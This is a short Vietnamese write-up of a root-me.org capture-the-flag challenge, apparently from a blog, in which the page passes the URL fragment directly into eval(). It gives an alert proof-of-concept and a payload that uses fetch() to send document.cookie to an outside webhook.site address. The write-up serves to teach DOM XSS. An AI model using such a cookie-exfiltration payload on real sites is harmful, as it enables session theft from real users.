---
title: "root-me.org — XSS (DOM base eval)"
date: 2024-02-11
description: Ghi chú ngắn về một sink eval() ăn thẳng vào fragment của URL, và cách lấy lại quyền điều khiển luồng thực thi.
tags: [writeup, xss, dom]
---

## Đề bài

Challenge cho một trang tĩnh và yêu cầu chạy được JavaScript trong ngữ cảnh của trang. Điểm đáng chú ý là
**không có tham số query** nào được phản chiếu ra HTML — server gần như không tham gia, mọi thứ nằm ở phía client.

Đọc source thì thấy đúng một dòng đáng giá:

```js
eval(location.hash.slice(1));
```

Toàn bộ phần sau dấu `#` được cắt ra và đưa thẳng vào `eval()`. Đây là sink mạnh nhất có thể có: không cần phá thẻ,
không cần thoát chuỗi, chỉ cần viết đúng cú pháp JS.

## Khai thác

Payload nằm ngay trên fragment:

```text
https://target/#alert(document.domain)
```

![Alert bật lên từ fragment](/img/posts/webhacking-dom-xss/6C2sZtA.png)

Từ đây nâng lên lấy cookie cũng chỉ là đổi phần thân:

```js
#fetch('https://webhook.site/<id>?c='+document.cookie)
```

> **Ghi chú:** vì là `eval` trên `location.hash`, payload chỉ chạy khi trang được tải *sau* khi fragment đã có.
> Mở link sẵn từ đầu thì được, còn gõ fragment vào thanh địa chỉ của tab đang mở thì phải reload — dễ mất thời
> gian nếu không để ý.
